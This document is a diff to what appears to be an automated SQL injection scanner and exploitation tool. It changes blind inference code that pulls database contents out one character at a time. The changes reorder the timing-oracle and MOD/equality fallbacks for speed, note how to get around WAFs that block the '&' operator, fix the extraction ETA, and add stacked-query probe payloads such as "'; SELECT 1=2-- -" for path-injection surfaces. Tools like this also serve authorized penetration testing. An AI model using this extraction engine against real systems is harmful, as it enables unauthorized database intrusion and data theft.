@@ -62092,6 +62092,7 @@ class Scanner:
             _true_times = []
             _false_times = []
             _start_t = time.monotonic()
+            _char_extraction_start_t = None  # BUG-ETA-INFLATION FIX: track when actual char extraction begins
             _consecutive_fails = 0
 
             # ── Per-character fallback methods when bisection fails ──────────────
@@ -62763,10 +62764,28 @@ class Scanner:
                     # Path B — _bitwise_oracle_sane AND _boolean_oracle:
                     #   Try native & bitwise first; on None: MOD fallback, then equality.
                     if not _bitwise_oracle_sane or not _boolean_oracle:
-                        _bwch = await _fallback_modbit(query, pos)
-                        if _bwch is None:
-                            # MOD blocked or oracle dead → last resort: linear equality scan
+                        # BUG-TIMING-ORACLE-DISPATCH-ORDER FIX (HIGH): When _boolean_oracle
+                        # is False (timing oracle), MOD-based extraction needs 7 timing probes
+                        # per char (each bit fires one slow probe when set). Equality scan
+                        # with timing oracle needs on average ~8 fast probes + 1 slow probe
+                        # per char — roughly 2-3× faster for high sleep values (>5s).
+                        # The original dispatch (MOD→equality) was designed for boolean
+                        # oracles where MOD avoids WAF-blocked & operator. For timing oracle
+                        # both MOD and equality avoid &, so correctness is equal; equality
+                        # wins on speed. Only reverse order when timing oracle is active;
+                        # for non-sane bitwise (data-aware WAF) with boolean oracle, keep
+                        # MOD first since it shares the same speed as bitwise.
+                        if not _boolean_oracle:
+                            # Timing oracle: equality first (faster), MOD as fallback
                             _bwch = await _fallback_equality(query, pos)
+                            if _bwch is None:
+                                _bwch = await _fallback_modbit(query, pos)
+                        else:
+                            # Boolean oracle, data-aware WAF: MOD first, equality fallback
+                            _bwch = await _fallback_modbit(query, pos)
+                            if _bwch is None:
+                                # MOD blocked or oracle dead → last resort: linear equality scan
+                                _bwch = await _fallback_equality(query, pos)
                         if _bwch is None:
                             _consecutive_fails += 1
                             if _consecutive_fails >= 3:
@@ -62777,8 +62796,12 @@ class Scanner:
                         _consecutive_fails = 0
                         ch = _bwch
                         result += ch
-                        _elapsed = time.monotonic() - _start_t
-                        _per_char = _elapsed / pos
+                        # BUG-ETA-INFLATION FIX: Use per-char extraction start time so ETA
+                        # is not inflated by calibration/sanity/bitwise-attempt setup time.
+                        if _char_extraction_start_t is None:
+                            _char_extraction_start_t = time.monotonic()
+                        _elapsed = time.monotonic() - _char_extraction_start_t
+                        _per_char = _elapsed / pos if pos > 0 else 0
                         _remaining = (max_len - pos) * _per_char if max_len > 0 else 0
                         LOG.info("[Inference] %s[%d] = %r  %r  (%d reqs, ETA ~%.0fs, modbit-safe)",
                                  label, pos, ch, result, _req_count, _remaining)
@@ -62805,8 +62828,11 @@ class Scanner:
                     _consecutive_fails = 0
                     ch = _bwch
                     result += ch
-                    _elapsed = time.monotonic() - _start_t
-                    _per_char = _elapsed / pos
+                    # BUG-ETA-INFLATION FIX: Use per-char extraction start time
+                    if _char_extraction_start_t is None:
+                        _char_extraction_start_t = time.monotonic()
+                    _elapsed = time.monotonic() - _char_extraction_start_t
+                    _per_char = _elapsed / pos if pos > 0 else 0
                     _remaining = (max_len - pos) * _per_char if max_len > 0 else 0
                     LOG.info("[Inference] %s[%d] = %r  %r  (%d reqs, ETA ~%.0fs, bitwise-fallback)",
                              label, pos, ch, result, _req_count, _remaining)
@@ -63025,9 +63051,11 @@ class Scanner:
                 # Fix: reset after any successful character extraction.
                 _consecutive_fails = 0
 
-                # ETA calculation
-                _elapsed = time.monotonic() - _start_t
-                _per_char = _elapsed / pos
+                # ETA calculation — BUG-ETA-INFLATION FIX: use per-char extraction start
+                if _char_extraction_start_t is None:
+                    _char_extraction_start_t = time.monotonic()
+                _elapsed = time.monotonic() - _char_extraction_start_t
+                _per_char = _elapsed / pos if pos > 0 else 0
                 _remaining = (max_len - pos) * _per_char if max_len > 0 else 0
                 _conf = _score_confidence(pos, _true_times[-3:], _false_times[-3:])
                 _char_confidence[pos] = _conf
@@ -63091,8 +63119,11 @@ class Scanner:
                         continue
                     _consecutive_fails = 0
                     result += _bwch
-                    _elapsed = time.monotonic() - _start_t
-                    _per_char = _elapsed / pos
+                    # BUG-ETA-INFLATION FIX: use per-char extraction start time
+                    if _char_extraction_start_t is None:
+                        _char_extraction_start_t = time.monotonic()
+                    _elapsed = time.monotonic() - _char_extraction_start_t
+                    _per_char = _elapsed / pos if pos > 0 else 0
                     _remaining = (max_len - pos) * _per_char if max_len > 0 else 0
                     LOG.info("[Inference] %s[%d] = %r  %r  (%d reqs, ETA ~%.0fs, modbit-restart)",
                              label, pos, _bwch, result, _req_count, _remaining)
@@ -124554,6 +124585,30 @@ class TechniqueCascadeEngine:
                             # error/diff is injection-specific. Fix: use original as fallback.
                             _s_clean_fallback = not bool(_s_clean_p)
                             _s_clean_probe_val = original if _s_clean_fallback else original + _s_clean_p
+                            # BUG-S-PATH-INJECTION-SEMICOLON-STRIP FIX (CRITICAL): On path-injection
+                            # surfaces, _make_false_payload() strips ';' from non-timing stacked
+                            # payloads (e.g. '; SELECT USER()-- -' → ' AND 1=2-- -'). The resulting
+                            # false probe does NOT corrupt the URL path → returns 200 (diff≈0.0) →
+                            # NOT > 0.20 threshold → falls to "clean probe OK" → FP passes through.
+                            # Fix: detect path-injection surface; when _make_false_payload stripped
+                            # the ';', replace with a ';'-bearing safe false probe so the path
+                            # corruption is also present in the clean probe → false probe also 404 →
+                            # diff > 0.20 → FP correctly rejected by the existing diff check below.
+                            _s_is_path_inj = (
+                                '*' in (url or '') or
+                                (param or '').lower() in ('path-injection', '__path__',
+                                                          '__path_seg__', 'path') or
+                                data_fmt == 'path'
+                            )
+                            if (_s_is_path_inj and ';' in payload and
+                                    ';' not in (_s_clean_probe_val or '')):
+                                _dbms_upper = (dbms or '').upper()
+                                if 'ORACLE' in _dbms_upper:
+                                    _s_clean_p = "'; SELECT 1=2 FROM DUAL-- -"
+                                else:
+                                    _s_clean_p = "'; SELECT 1=2-- -"
+                                _s_clean_fallback = False
+                                _s_clean_probe_val = original + _s_clean_p
                             _s_clean_ok = True
                             if True:  # always run clean probe
                                 if _SCAN_STOPPED[0]: return None  # BUG-FIX-REQ4-S-CLEAN
